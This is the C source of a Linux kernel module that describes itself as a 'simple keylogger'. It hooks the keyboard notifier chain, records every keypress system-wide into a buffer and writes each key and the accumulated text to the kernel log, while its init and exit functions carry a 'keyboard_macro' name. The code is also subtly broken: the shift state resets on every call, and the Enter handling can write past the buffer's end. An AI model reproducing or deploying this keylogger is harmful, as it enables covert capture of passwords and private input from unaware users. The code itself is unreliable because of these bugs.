#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/input.h>
#include <linux/keyboard.h>
#include <linux/uaccess.h>

// Buffer to store typed characters
#define BUFFER_SIZE 256
static char key_buffer[BUFFER_SIZE];
static int buffer_index = 0;
// Assuming max keycode of 255 or whatever your platform defines
#define MAX_KEYCODE 255

// Adjusted keymap size
static const char *keymap[MAX_KEYCODE + 1] = {
    [KEY_A] = "a", [KEY_B] = "b", [KEY_C] = "c", [KEY_D] = "d",
    [KEY_E] = "e", [KEY_F] = "f", [KEY_G] = "g", [KEY_H] = "h",
    [KEY_I] = "i", [KEY_J] = "j", [KEY_K] = "k", [KEY_L] = "l",
    [KEY_M] = "m", [KEY_N] = "n", [KEY_O] = "o", [KEY_P] = "p",
    [KEY_Q] = "q", [KEY_R] = "r", [KEY_S] = "s", [KEY_T] = "t",
    [KEY_U] = "u", [KEY_V] = "v", [KEY_W] = "w", [KEY_X] = "x",
    [KEY_Y] = "y", [KEY_Z] = "z",
    [KEY_1] = "1", [KEY_2] = "2", [KEY_3] = "3", [KEY_4] = "4",
    [KEY_5] = "5", [KEY_6] = "6", [KEY_7] = "7", [KEY_8] = "8",
    [KEY_9] = "9", [KEY_0] = "0",
    [KEY_SPACE] = " ", [KEY_ENTER] = "\n"
};

// Function to handle key events safely
static int keyboard_event(struct notifier_block *nb, unsigned long code, void *param)
{
    struct keyboard_notifier_param *kp = param;

    short shift_pressed = 0;  // State of Shift key

    // Log every key event
    if (code == KBD_KEYCODE) { // Key event
        // Update Shift key state
        if (kp->value == KEY_LEFTSHIFT || kp->value == KEY_RIGHTSHIFT) {
            shift_pressed = kp->down;  // Update shift state when the key is pressed or released
        }

        if (kp->down) { // Only process when the key is pressed
            if (kp->value < 0 || kp->value > MAX_KEYCODE) {
                pr_err("Invalid keycode: %d\n", kp->value);
                return NOTIFY_OK;  // Invalid keycode, do nothing
            }

            const char *key_char = keymap[kp->value];
            if (key_char) { // If key has a valid mapping
                pr_info("Key event: char = %s\n", key_char);

                // If Shift is pressed, use uppercase
                char display_char = key_char[0]; // Get the actual character
                if (shift_pressed && display_char >= 'a' && display_char <= 'z') {
                    display_char = display_char - 'a' + 'A';  // Convert to uppercase
                }

                // Save to buffer
                if (buffer_index < BUFFER_SIZE - 1) {
                    if (kp->value == KEY_ENTER) {
                        key_buffer[buffer_index++] = '\\';
                        key_buffer[buffer_index++] = 'n'; // Save newline character
                    } else {
                        key_buffer[buffer_index++] = display_char;  // Save the modified character
                    }

                    key_buffer[buffer_index] = '\0'; // Null-terminate the buffer
                    pr_info("Buffer: %s\n", key_buffer); // Print the buffer content
                }
            } else {
                pr_info("Key event: unmapped keycode = %d\n", kp->value);
            }
        }
    }

    return NOTIFY_OK;
}




// Notifier block setup
static struct notifier_block keyboard_nb = {
    .notifier_call = keyboard_event
};

// Module init and exit
static int __init keyboard_macro_init(void)
{
    int ret;

    // Register keyboard notifier
    ret = register_keyboard_notifier(&keyboard_nb);
    if (ret) {
        pr_err("Failed to register keyboard notifier\n");
        return ret;
    }

    pr_info("Keyboard logging module loaded\n");
    return 0;
}

static void __exit keyboard_macro_exit(void)
{
    unregister_keyboard_notifier(&keyboard_nb);
    pr_info("Keyboard logging module unloaded\n");
}

module_init(keyboard_macro_init);
module_exit(keyboard_macro_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR(";)))");
MODULE_DESCRIPTION("simple keylogger for detecting input");
